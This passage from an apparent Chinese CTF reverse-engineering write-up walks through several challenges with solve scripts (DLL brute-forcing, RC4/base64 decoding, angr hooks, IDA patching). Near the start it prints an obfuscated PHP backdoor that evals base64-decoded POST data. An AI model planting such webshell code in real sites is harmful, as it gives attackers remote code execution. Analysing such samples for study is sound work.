class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">23</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">40</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">21</span>, <span class="number">47</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">47</span>);</span><br><span class="line"><span class="variable">$do_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$order</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$do_me</span> = <span class="variable">$do_me</span>.<span class="variable">$terms</span>[<span class="variable">$order</span>[<span class="variable">$i</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$do_me</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接 echo 输出一下 <code>$do_me</code>，得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>= <span class="string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#x27;</span>;<span class="comment">// $code=base64_decode($_); eval($code); </span></span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;</span>;<span class="comment">// base64_decode</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$___</span>(<span class="variable">$__</span>));</span><br></pre></td></tr></table></figure><p>于是对 <code>$_</code> 进行base64_decode，得到 <code>\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D</code>，\ 后面跟十进制数，\x 后面跟十六进制数。转换一下再输出，得到 <strong>a11DOTthatDOTjava5crapATflareDASHonDOTcom</strong>。按照 flareon 比赛 flag 的尿性，DOT 要换成 .，AT 换成 @，DASH 换成 -，得到最终的 flag</p><br><h3 id="2019红帽杯-Snake-x86-exe-NET-Unity游戏"><a href="#2019红帽杯-Snake-x86-exe-NET-Unity游戏" class="headerlink" title="[2019红帽杯]Snake | x86,exe,.NET,Unity游戏"></a>[2019红帽杯]Snake | x86,exe,.NET,Unity游戏</h3><p>dnSpy 打开 Assembly-CSharp.dll，一顿找，没找到和 flag 有关的方法。翻阅游戏目录的时候倒是发现了一个 Plugins 目录，里面有一个 Interface.dll，正好在 Assembly-CSharp.dll 里也有导入：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFSnake/1.png" alt="2019红帽杯Snake"></p><p>ida 打开 Interface.dll，shift + F12，查找 “You win! flag is “ 字符串的交叉引用，来到函数 GameObject，该函数正是被 Assembly-CSharp.dll 导过去使用的。回到 dnSpy  查找对于 GameObject 的引用：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFSnake/2.png" alt="2019红帽杯Snake"></p><p>调用时传入游戏角色的 x，y 坐标，也就是说输入为两个 int，而 GameObject 只用到了 x，并且只有当 x 在 [0, 0x63] 范围内时，才会判断是否输出 flag：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFSnake/3.png" alt="2019红帽杯Snake"></p><p>考虑写个 C++ 脚本直接调 GameObject 来爆破</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (WINAPI* FGameObject)(<span class="keyword">int</span> x, <span class="keyword">int</span> y);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Interface.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hDll) &#123;</span><br><span class="line">FGameObject GameObject = (FGameObject)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;GameObject&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (GameObject) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x63</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Testing: &quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line"><span class="built_in">GameObject</span>(i, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Failed to load dll, plz check dll path.&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x 为 19 时得到 flag：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFSnake/4.png" alt="2019红帽杯Snake"></p><p>PS. 当然用 python 也能调 dll 的方法，甚至更方便，不过效率肯定是不如 C++ 的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dll = cdll.LoadLibrary(<span class="string">&quot;Interface.dll&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">dll.GameObject(i)</span><br></pre></td></tr></table></figure><br><h3 id="MRCTF2020-EasyCpp-x86-elf"><a href="#MRCTF2020-EasyCpp-x86-elf" class="headerlink" title="[MRCTF2020]EasyCpp | x86,elf"></a>[MRCTF2020]EasyCpp | x86,elf</h3><p>分析 main 函数：</p><p><img src="../img/MRCTF2020EasyCpp/1.png" alt="MRCTF2020EasyCpp"></p><p>其中匿名函数 check 中用到的 ans 数组由 init_array 中的 sub_I_keys 函数初始化。其余没啥好说的，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = [<span class="string">&quot;=zqE=z=z=z&quot;</span>, <span class="string">&quot;=lzzE&quot;</span>, <span class="string">&quot;=ll=T=s=s=E&quot;</span>, <span class="string">&quot;=zATT&quot;</span>, <span class="string">&quot;=s=s=s=E=E=E&quot;</span>, <span class="string">&quot;=EOll=E&quot;</span>, <span class="string">&quot;=lE=T=E=E=E&quot;</span>, <span class="string">&quot;=EsE=s=z&quot;</span>, <span class="string">&quot;=AT=lE=ll&quot;</span>]</span><br><span class="line">dic = &#123;<span class="string">&#x27;O&#x27;</span>:<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;E&#x27;</span>:<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;G&#x27;</span>:<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;B&#x27;</span>:<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;=&#x27;</span>:<span class="string">&#x27; &#x27;</span>&#125;</span><br><span class="line">repl = <span class="keyword">lambda</span> obj : dic[obj.group(<span class="number">0</span>)]</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">val = <span class="number">1</span></span><br><span class="line">tmp = re.sub(<span class="string">&quot;.&quot;</span>, repl, t).strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">val *= <span class="built_in">int</span>(i)</span><br><span class="line">s += <span class="built_in">str</span>(val ^ <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> hashlib.md5(s).hexdigest().upper()</span><br></pre></td></tr></table></figure><br><h3 id="GUET-CTF2019-encrypt-x86-elf-rc4-base64"><a href="#GUET-CTF2019-encrypt-x86-elf-rc4-base64" class="headerlink" title="[GUET-CTF2019]encrypt | x86,elf,rc4,base64"></a>[GUET-CTF2019]encrypt | x86,elf,rc4,base64</h3><p>程序逻辑：</p><p><img src="../img/GUETCTF2019encrypt/1.png" alt="GUETCTF2019encrypt"></p><p>首先对输入做 rc4 加密，之后对加密结果进行变种 base64 编码：</p><p><img src="../img/GUETCTF2019encrypt/2.png" alt="GUETCTF2019encrypt"></p><p>从上图可以发现编码表变成了 ascii 码从 ‘=’ 开始的字符数组，解题脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">from Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">func = lambda x : <span class="string">&#x27;=&#x27;</span> <span class="keyword">if</span> x == <span class="string">&#x27;=&#x27;</span> <span class="keyword">else</span> table[<span class="built_in">ord</span>(x) - <span class="built_in">ord</span>(<span class="string">&#x27;=&#x27;</span>)]</span><br><span class="line">table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"></span><br><span class="line">target = r<span class="string">&quot;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=&quot;</span></span><br><span class="line">target = <span class="built_in">map</span>(func, target)</span><br><span class="line">encoded = base64.<span class="built_in">b64decode</span>(<span class="string">&#x27;&#x27;.join(target))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key = &quot;\x10\x20\x30\x30\x20\x20\x10\x40&quot;</span></span><br><span class="line"><span class="string">rc4 = ARC4.new(key)</span></span><br><span class="line"><span class="string">print rc4.decrypt(encoded)</span></span><br></pre></td></tr></table></figure><br><h3 id="GKCTF2020-EzMachine-x86-exe-vm虚拟机"><a href="#GKCTF2020-EzMachine-x86-exe-vm虚拟机" class="headerlink" title="[GKCTF2020]EzMachine | x86,exe,vm虚拟机"></a>[GKCTF2020]EzMachine | x86,exe,vm虚拟机</h3><p>遇到虚拟机一般分三个阶段，第一阶段 angr 开冲。没跑出来的话进第二阶段 —— 乖乖分析 <strong>指令/数据寄存器、内存、指令</strong> 等要素都被抽象到哪些变量中去了，然后跟着指令流走一遍理解虚拟机干了啥，写脚本。第三个阶段就是关掉 ida，世界清静……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Such_A_EZVM&#125;</span><br></pre></td></tr></table></figure><br><h3 id="BSidesSF2019-blink-JVM-apk"><a href="#BSidesSF2019-blink-JVM-apk" class="headerlink" title="[BSidesSF2019]blink | JVM,apk"></a>[BSidesSF2019]blink | JVM,apk</h3><p>jadx 打开，com.example.blink 包的 r2d2 类里有一串 base64：</p><p><img src="../img/BSidesSF2019blink/1.png" alt="BSidesSF2019blink"></p><p>解码成图片得到 flag</p><br><h3 id="NPUCTF2020-Baby-Obfuscation-x86-exe-混淆"><a href="#NPUCTF2020-Baby-Obfuscation-x86-exe-混淆" class="headerlink" title="[NPUCTF2020]Baby Obfuscation | x86,exe,混淆"></a>[NPUCTF2020]Baby Obfuscation | x86,exe,混淆</h3><p>首先根据函数行为还原 FOX1 ~ FOX5 函数的符号：</p><p><img src="../img/NPUCTF2020BabyObfuscation/1.png" alt="NPUCTF2020BabyObfuscation"></p><p>分别是 gcd（最大公因数），nor（或非），and（a &amp; b），sub（a - b），pow（a 的 b 次方）。先看判断结果是否正确的部分：</p><p><img src="../img/NPUCTF2020BabyObfuscation/2.png" alt="NPUCTF2020BabyObfuscation"></p><p>得到两个信息，输入为 15 个字符、输入变换后的结果与 v31 数组有关。再来看对输入变换的部分：</p><p><img src="../img/NPUCTF2020BabyObfuscation/3.png" alt="NPUCTF2020BabyObfuscation"></p><p>也是 for 循环逐字节处理，其中需要 if 判断后才对 v31 进行操作的部分有 4 个，分别称其为 op1 ~ 4，使用 angr 来测试每个字符经过了哪些 op：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">project = angr.Project(<span class="string">&quot;./attachment.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params">addr = <span class="number">0x401712</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook0</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="comment"># modify variable &quot;inputLen&quot;</span></span><br><span class="line">state.mem[state.regs.rbp+<span class="number">0x1470</span>].dword = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x40174C</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook1</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="keyword">global</span> count</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;char %d:&quot;</span> % count)</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x4017C6</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook2</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;op1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x40189D</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook3</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;op2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401994</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook4</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;op3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401A48</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook5</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;op4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401B51</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook6</span>(<span class="params">state</span>):</span></span><br><span class="line">project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure><p>从输出可以得知每个字符都只经过了 op1 和 op3 变换，并且最后会乘上 10。解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">AOX6 = [<span class="number">0</span>, <span class="number">7801</span>, <span class="number">7801</span>, <span class="number">8501</span>, <span class="number">5901</span>, <span class="number">8001</span>, <span class="number">6401</span>, <span class="number">11501</span>, <span class="number">4601</span>, <span class="number">9801</span>, <span class="number">9601</span>, <span class="number">11701</span>, <span class="number">5301</span>, <span class="number">9701</span>, <span class="number">10801</span>, <span class="number">12501</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(AOX6) - <span class="number">1</span>, <span class="number">1</span>):</span><br><span class="line">tmp = (AOX6[j] - <span class="number">1</span>) // <span class="number">100</span></span><br><span class="line">tmp ^= key[(j - <span class="number">1</span>) % <span class="number">4</span>]<span class="comment"># op3</span></span><br><span class="line">tmp += key[(j - <span class="number">1</span>) % <span class="number">4</span>]<span class="comment"># op1</span></span><br><span class="line">flag += <span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="ACTF新生赛2020-Splendid-MineCraft-x86-exe-SMC"><a href="#ACTF新生赛2020-Splendid-MineCraft-x86-exe-SMC" class="headerlink" title="[ACTF新生赛2020]Splendid_MineCraft | x86,exe,SMC"></a>[ACTF新生赛2020]Splendid_MineCraft | x86,exe,SMC</h3><p>shift + F12 查找字符串 “Wrong\n” 的交叉引用，来到 main 函数 sub_401080。在检查输入长度是否为 26，开头是否为 “ACTF{“，最后一个字符是否为 “}” 后，通过 strtok 将输入分为 3 段，猜测 flag 形似 <code>ACTF&#123;aaaaaa_bbbbbb_cccccc&#125;</code>。之后调用 loc_4051D8 进行第一次 SMC，使用 python ida 脚本还原 0x4051FC 处的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x4051FC</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x152</span>):</span><br><span class="line">b = get_bytes(addr + i, <span class="number">1</span>)</span><br><span class="line">idc.PatchByte(addr + i, <span class="built_in">ord</span>(b) ^ <span class="number">0x72</span>)</span><br></pre></td></tr></table></figure><p>阅读 0x4051FC 处的汇编代码后，得到 flag 的第一段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v2 = [<span class="number">87</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">32</span>]</span><br><span class="line">v5 = [<span class="number">51</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">59</span>, <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">s1 += <span class="built_in">chr</span>((v2[i+<span class="number">1</span>] ^ v5[i]) + <span class="number">35</span>)</span><br><span class="line"><span class="built_in">print</span> s1</span><br></pre></td></tr></table></figure><p>之后返回 main 函数进行第二次 SMC，脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x405018</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>, <span class="number">496</span>):</span><br><span class="line">b = get_bytes(addr + i, <span class="number">1</span>)</span><br><span class="line">idc.PatchByte(addr + i, <span class="built_in">ord</span>(b) ^ <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>同理阅读第二段汇编后得到 flag 第二段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table = [<span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x9D</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x68</span>, <span class="number">0x8C</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xBB</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0xD4</span>, <span class="number">0x09</span>, <span class="number">0xFD</span>, <span class="number">0xF3</span>, <span class="number">0x5C</span>, <span class="number">0x3C</span>, <span class="number">0x4C</span>,</span><br><span class="line"><span class="number">0x36</span>, <span class="number">0x8E</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x44</span>, <span class="number">0xD6</span>, <span class="number">0xA9</span>, <span class="number">0x01</span>, <span class="number">0x32</span>,</span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x29</span>, <span class="number">0x90</span>, <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x1D</span>,</span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0x2A</span>, <span class="number">0x2C</span>, <span class="number">0x59</span>, <span class="number">0x9E</span>, <span class="number">0x3D</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x74</span>, <span class="number">0xD1</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x02</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x57</span>, <span class="number">0xC6</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0x2B</span>, <span 